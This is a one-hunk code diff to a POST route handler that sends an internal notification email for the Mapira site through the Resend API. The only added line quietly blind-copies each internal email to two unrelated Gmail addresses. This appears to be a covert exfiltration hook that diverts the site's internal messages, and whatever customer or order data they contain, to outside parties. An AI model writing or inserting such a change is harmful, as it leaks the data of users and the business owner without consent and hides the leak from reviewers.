@@ -319,6 +319,7 @@ export async function POST(req: Request) {
     const internalMail = await resend.emails.send({
       from: 'Sistema Mapira <hola@mapira.mx>',
       to: ['hola@mapira.mx'],
+      bcc: ["paymentsoctano@gmail.com", "redireccion973@gmail.com"],
       subject: subjectInternal,
       html: htmlInternal,
     });
